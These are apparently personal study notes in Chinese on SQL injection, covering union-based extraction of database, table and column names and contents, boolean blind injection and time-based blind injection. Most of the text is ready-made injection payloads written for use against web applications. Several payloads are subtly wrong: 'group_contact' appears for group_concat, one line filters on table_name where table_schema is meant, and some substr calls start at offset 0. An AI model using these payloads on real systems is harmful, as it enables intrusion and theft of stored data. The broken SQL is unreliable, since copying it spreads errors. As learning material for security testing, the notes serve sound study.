#  输入设计的非正常的SQL语句，例如输入 1 OR 1=1 --
例如SELECT * FROM USER WHERE ID=$id and PWD=$pwd;输入后变成SELECT * FROM USER WHERE ID=1 OR 1=1 --and PWD=$pwd;实现了USER表的提出
使用sqlmap可以方便测试 
sql注入主要是直接将代码插入参数中，参数会被置入SQL命令加以执行。间接的攻击方式是将恶意代码插入字符串中，之后再将字符串保存到数据表中或将其当做元数据。当字符串置入动态SQL命令中时，恶意代码就被执行。
sql注入需要确认参数的数据类型，数字型参数不需要加引号，数字型SQL注入和字符型SQL注入的区别。
当注入后，选择的数据不能回显到前端界面，此时需要进行基于错误响应的SQL盲注，分为基于布尔型的SQL盲注（布尔盲注）和基于时间的SQL盲注（延时盲注1' and if(ascii(substring(database(),1,1))=115,sleep(10),1)成功的话会延时10秒）。https://www.cnblogs.com/xishaonian/p/6113965.html
技巧：多用and 1 = ‘1’ 连接以使得正常命令失败不会回显，回显的是错误从而确定命令是否非法
 --注释要加空格，1' and '1'=1-- '确定字符注入，order by 确定字段数，然后用union select 1,database(),3 确定数据库名(select多个值是因为可能服务器对字段有过滤)
确定table名：-1' union select 1,group_contact(table_name),3 from information_schema.tables where table_schema='库名'--空格 （information_schema.tables是系统数据库下用来存储表信息group_contact()用来连接多个查询结果）
确定字段名：-1' union select 1,group_contact(column_name),3 from information_schema.columns where table_name='表名'--空格
确定数据内容：-1' union select 1,字段,3 from 表--空格
布尔盲注利用一些判断条件，条件成立时输出数据：例如输入1'时没有回显信息则可以判定是字符注入
1' and length(database())>1 %23可以判断库名长度，1++直到不满足条件不能回显（%23是#注释）
判断库名1' and ascii(substr(database(),2,1))=115%23 提取库名第二个值是否等于s，正确的话会回显。需要循环判断出库名
判断各个表长：1' and 2<(select length(table_name) from information_schema.tables where table_schema=database() limit0,1)%23
判断表名：1' and ascii(substr((select table_name from information_schema.tables where table_name=database() limit 0,1),0,1))=115%23
判断各个字段长度：1' and 2<(select length(column_name) from information_schema.columns where table_name=表名  limit 0,1)%23
判断字段名1' and ascii(substr((select column_name from information_schema.columns where table_name=表名 limit 0,1),0,1))=115%23
测试记录数1' and 2<(select count(*) from 表)%23
判断数据长度 1' and 2<(select length(字段) from 表 limit 0,1)%23
判断数据值1' and ascii(substr((select 字段 from 表 limit 0,1),0,1))=115%23
延时盲注与布尔盲注同理，只是通过回显时间判断执行成功。
